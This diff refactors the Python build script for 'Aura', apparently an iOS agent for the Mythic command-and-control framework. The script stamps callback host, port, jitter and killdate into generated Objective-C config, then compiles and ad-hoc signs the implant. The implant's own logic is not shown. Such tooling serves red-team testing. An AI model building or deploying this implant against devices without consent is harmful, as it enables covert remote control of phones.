@@ -4,6 +4,7 @@ from mythic_container.MythicRPC import *
 import asyncio
 import os
 import subprocess
+import pathlib
 
 
 class Aura(PayloadType):
@@ -22,45 +23,86 @@ class Aura(PayloadType):
     agent_path = pathlib.Path(".") / "aura"
     agent_icon_path = agent_path / "agent_functions" / "Microsoft_logo.svg"
     agent_code_path = agent_path / "agent_code"
-
     build_path = agent_path / "build"
     aura_payload_path = build_path / "aura_payload"
 
     build_steps = [
-        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
+        BuildStep(step_name="Validating Build Settings", step_description="Making sure all commands have backing files on disk"),
+        BuildStep(step_name="Configuring C2", step_description="Stamping in configuration values"),
         BuildStep(step_name="Compiling and Linking Objective-C", step_description="Compiling and linking the payload for iOS."),
         BuildStep(step_name="Signing entitlements", step_description="Signing entitlements to the payload."),
-        BuildStep(step_name="Configuring", step_description="Stamping in configuration values")
     ]
 
     async def build(self) -> BuildResponse:
         resp = BuildResponse(status=BuildStatus.Success)
 
         try:
-            sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
-            clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"
-            objc_flags = "-x objective-c -fobjc-arc -std=gnu11"
+            sdk_path, clang_compiler_path, objc_flags = await self._get_build_settings()
 
-            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="Gathering Files",
-                StepStdout="Successfully gathered Aura sources",
-                StepSuccess=True
-            ))
+            await self._update_build_step("Validating Build Settings", "Successfully gathered Aura sources", True)
 
-            # Extract C2 parameters
-            params = self.c2info[0].get_parameters_dict()
-            headers = params.get("headers", {})
-            callback_host = params.get("callback_host", "localhost")
-            callback_port = params.get("callback_port", 80)
-            callback_interval = params.get("callback_interval", 10)
-            callback_jitter = params.get("callback_jitter", 23)
-            killdate = params.get("killdate", "2025-09-18")
+            params = self._extract_c2_parameters()
 
-            print(f"\n\nPARAMS: {params}\n\n")
+            self._create_http_config(params)
 
-            # Dynamically create the HTTPC2Config.m file with the config values injected
-            config_objc_code = f"""
+            os.makedirs(f"{self.build_path}", exist_ok=True)
+
+            compile_link_cmd = self._generate_compile_command(clang_compiler_path, objc_flags, sdk_path)
+            await self._run_command(compile_link_cmd, "Compiling and Linking Objective-C", resp)
+
+            codesign_command = self._generate_codesign_command()
+            await self._run_command(codesign_command, "Signing entitlements", resp)
+
+            if os.path.exists(self.aura_payload_path):
+                resp.payload = open(self.aura_payload_path, "rb").read()
+
+            resp.build_message = "Successfully built and signed Aura payload!"
+            resp.status = BuildStatus.Success
+
+        except Exception as e:
+            resp.set_status(BuildStatus.Error)
+            resp.build_message = f"Exception: {str(e)}"
+
+        return resp
+
+    async def _get_build_settings(self):
+        sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
+        clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"
+        objc_flags = "-x objective-c -fobjc-arc -std=gnu11"
+        
+        # Check if paths exist
+        if not pathlib.Path(sdk_path).exists():
+            await self._update_build_step("Validating Build Settings", f"Error: SDK path not found at {sdk_path}", False)
+        
+        # Check if clang compiler exists
+        if not pathlib.Path(clang_compiler_path).exists():
+            await self._update_build_step("Validating Build Settings", f"Error: Clang compiler not found at {clang_compiler_path}", False)
+        
+        return sdk_path, clang_compiler_path, objc_flags
+
+
+    async def _update_build_step(self, step_name, step_stdout, step_success):
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName=step_name,
+            StepStdout=step_stdout,
+            StepSuccess=step_success
+        ))
+
+    def _extract_c2_parameters(self):
+        params = self.c2info[0].get_parameters_dict()
+        print(f"\n\nPARAMS: {params}\n\n")
+        return params
+
+    def _create_http_config(self, params):
+        callback_host = params.get("callback_host", "localhost")
+        callback_port = params.get("callback_port", 80)
+        callback_interval = params.get("callback_interval", 10)
+        callback_jitter = params.get("callback_jitter", 23)
+        killdate = params.get("killdate", "2025-09-18")
+        headers = params.get("headers", {})
+
+        config_objc_code = f"""
 #import "HTTPC2Config.h"
 
 @implementation HTTPC2Config
@@ -104,7 +146,7 @@ class Aura(PayloadType):
 }}
 
 + (NSString *)payloadUUID {{
-    return @"{self.uuid}";  // Inject the Mythic Payload UUID here
+    return @"{self.uuid}";
 }}
 
 + (BOOL)encryptedExchangeCheck {{
@@ -141,68 +183,42 @@ class Aura(PayloadType):
 
 @end
 """
+        with open(f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m", 'w') as objc_file:
+            objc_file.write(config_objc_code)
 
-            # Write this dynamically generated Objective-C file to the c2_profiles directory
-            with open(f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m", 'w') as objc_file:
-                objc_file.write(config_objc_code)
+    def _generate_compile_command(self, clang_compiler_path, objc_flags, sdk_path):
+        source_files = [
+            "main.m",
+            "C2CheckIn.m",
+            "c2_profiles/HTTPC2Config.m",
+            "SystemInfoHelper.m",
+            "C2Task.m"
+        ]
 
+        source_file_paths = " ".join([f"{self.agent_code_path}/{src}" for src in source_files])
+        return (
+            f"{clang_compiler_path} {objc_flags} "
+            f"-target arm64-apple-ios12.0 -v "
+            f"-isysroot {sdk_path} "
+            f"-I {self.agent_code_path}/c2_profiles "
+            f"{source_file_paths} "
+            f"-framework Foundation -framework UIKit -lobjc "
+            f"-o {self.aura_payload_path} "
+        )
 
-            os.makedirs(f"{self.build_path}", exist_ok=True)
+    def _generate_codesign_command(self):
+        entitlements_file = self.agent_code_path / "base_entitlements.plist"
+        return f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"
 
-            # Function to run commands
-            async def run_command(command, step_name):
-                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                stdout, stderr = process.communicate()
+    async def _run_command(self, command, step_name, resp):
+        print(f"\n{command}\n")
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
 
-                if process.returncode != 0:
-                    print(f"Error during {step_name}:\n{stderr.decode()}")
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName=step_name,
-                        StepStdout=f"Failed to {step_name}",
-                        StepSuccess=False
-                    ))
-                    resp.set_status(BuildStatus.Error)
-                    resp.build_message = f"Error during {step_name}:\n{stderr.decode()}"
-                    return resp
-                else:
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName=step_name,
-                        StepStdout=f"Successfully {step_name}",
-                        StepSuccess=True
-                    ))
-
-            compile_link_cmd = (
-                f"{clang_compiler_path} {objc_flags} "
-                f"-target arm64-apple-ios12.0 -v "
-                f"-isysroot {sdk_path} "
-                f"-I {self.agent_code_path}/c2_profiles "
-                f"{self.agent_code_path}/main.m "
-                f"{self.agent_code_path}/C2CheckIn.m "
-                f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m "
-                f"{self.agent_code_path}/SystemInfoHelper.m "
-                f"{self.agent_code_path}/C2Task.m "
-                f"-framework Foundation -framework UIKit -lobjc "
-                f"-o {self.aura_payload_path} "
-            )
-
-            print(compile_link_cmd)
-            await run_command(compile_link_cmd, "Compiling and Linking Objective-C")
-
-            # Sign the payload
-            entitlements_file = self.agent_code_path / "base_entitlements.plist"
-            codesign_command = f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"
-            await run_command(codesign_command, "Signing payload")
-            if os.path.exists(self.aura_payload_path):
-                    resp.payload = open(self.aura_payload_path, "rb").read()
-            resp.build_message = "Successfully built and signed Aura payload!"
-            resp.status = BuildStatus.Success
-
-            return resp
-
-        except Exception as e:
+        if process.returncode != 0:
+            await self._update_build_step(step_name, f"Failed to {step_name}", False)
             resp.set_status(BuildStatus.Error)
-            resp.build_message = f"Exception: {str(e)}"
-
-        return resp
+            resp.build_message = f"Error during {step_name}:\n{stderr.decode()}"
+            return resp
+        else:
+            await self._update_build_step(step_name, f"Successfully {step_name}", True)
